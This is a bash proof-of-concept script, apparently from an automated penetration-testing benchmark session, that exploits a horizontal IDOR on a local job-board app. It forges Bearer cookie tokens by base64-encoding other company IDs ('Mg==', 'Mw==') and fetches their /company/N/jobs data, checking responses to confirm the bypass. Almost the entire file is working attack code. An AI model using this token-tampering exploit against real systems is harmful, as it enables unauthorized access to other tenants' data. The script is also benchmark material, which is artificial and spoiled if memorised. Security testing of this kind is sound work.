#!/bin/bash
# POC: Direct IDOR test using Bearer token tampering to access different companies' job data
# Target: ./repo
# Created: 2025-11-04T19:40:04.022Z
# Session: benchmark-XBEN-021-24-mhkyt5to

# Horizontal IDOR POC - Company Jobs Access via Bearer Token Tampering
# This script demonstrates accessing other companies' jobs by modifying the Bearer token
# Reference evidence shows: curl -b "user_token=\"Bearer Mg==\"" http://localhost:8080/company/2/jobs

TARGET_URL="${1:-http://localhost:8080}"

echo "[*] Horizontal IDOR POC - Company Jobs Access via Token Tampering"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Access company 1's jobs with legitimate token
echo "[+] Step 1: Accessing company 1 jobs with legitimate token (Bearer MQ==)..."
COMPANY_1_RESPONSE=$(curl -s -X GET "$TARGET_URL/company/1/jobs" \
  -b "user_token=Bearer MQ==")

HTTP_CODE_1=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$TARGET_URL/company/1/jobs" \
  -b "user_token=Bearer MQ==")

echo "[*] HTTP Code: $HTTP_CODE_1"
echo "[*] Company 1 Response:"
echo "$COMPANY_1_RESPONSE"
echo ""

# Step 2: Attempt IDOR - Access company 2 by tampering token
echo "[+] Step 2: Attempting IDOR - Accessing company 2 jobs with tampered token (Bearer Mg==)..."
COMPANY_2_RESPONSE=$(curl -s -X GET "$TARGET_URL/company/2/jobs" \
  -b "user_token=Bearer Mg==")

HTTP_CODE_2=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$TARGET_URL/company/2/jobs" \
  -b "user_token=Bearer Mg==")

echo "[*] HTTP Code: $HTTP_CODE_2"
echo "[*] Company 2 Response (IDOR test):"
echo "$COMPANY_2_RESPONSE"
echo ""

# Check for IDOR success
IDOR_CONFIRMED=0

if [ "$HTTP_CODE_2" = "200" ]; then
  echo "[!] Got HTTP 200 OK with tampered token for company 2"
  if echo "$COMPANY_2_RESPONSE" | grep -iq "company2"; then
    echo "[!] VULNERABILITY CONFIRMED: Response contains company2 data!"
    echo "[!] Successfully accessed company 2 jobs with tampered token"
    IDOR_CONFIRMED=1
  elif [ ! -z "$COMPANY_2_RESPONSE" ]; then
    echo "[!] VULNERABILITY CONFIRMED: Got valid response (not 401/403) with tampered token"
    echo "[!] This indicates authorization bypass via token tampering"
    IDOR_CONFIRMED=1
  fi
fi

echo ""

# Step 3: Further testing - Access company 3 by tampering token
echo "[+] Step 3: Further IDOR confirmation - Accessing company 3 with tampered token (Bearer Mw==)..."
COMPANY_3_RESPONSE=$(curl -s -X GET "$TARGET_URL/company/3/jobs" \
  -b "user_token=Bearer Mw==")

HTTP_CODE_3=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$TARGET_URL/company/3/jobs" \
  -b "user_token=Bearer Mw==")

echo "[*] HTTP Code: $HTTP_CODE_3"
echo "[*] Company 3 Response (IDOR test):"
echo "$COMPANY_3_RESPONSE"
echo ""

if [ "$HTTP_CODE_3" = "200" ]; then
  echo "[!] Got HTTP 200 OK with tampered token for company 3"
  if echo "$COMPANY_3_RESPONSE" | grep -iq "company3"; then
    echo "[!] VULNERABILITY CONFIRMED: Response contains company3 data!"
    echo "[!] Horizontal IDOR confirmed - attacker can access any company's jobs"
    IDOR_CONFIRMED=1
  elif [ ! -z "$COMPANY_3_RESPONSE" ]; then
    echo "[!] Got valid response for company 3 with tampered token"
    IDOR_CONFIRMED=1
  fi
fi

echo ""

# Step 4: Verify authorization is actually checked by attempting without token
echo "[+] Step 4: Verification - Attempting access without token..."
NO_TOKEN_HTTP=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$TARGET_URL/company/2/jobs")
echo "[*] HTTP Code without token: $NO_TOKEN_HTTP"

if [ "$NO_TOKEN_HTTP" = "401" ] || [ "$NO_TOKEN_HTTP" = "403" ]; then
  echo "[+] Confirmed: Authorization is required, but can be bypassed via token tampering"
fi

echo ""
echo "[*] POC Test Complete"

if [ "$IDOR_CONFIRMED" = "1" ]; then
  echo "[!] RESULT: Horizontal IDOR vulnerability CONFIRMED"
  echo "[!] Attacker can access any company's jobs by tampering with Bearer token"
  exit 0
else
  echo "[-] RESULT: Could not confirm IDOR vulnerability"
  echo "[-] Check if application is running and vulnerable"
  exit 1
fi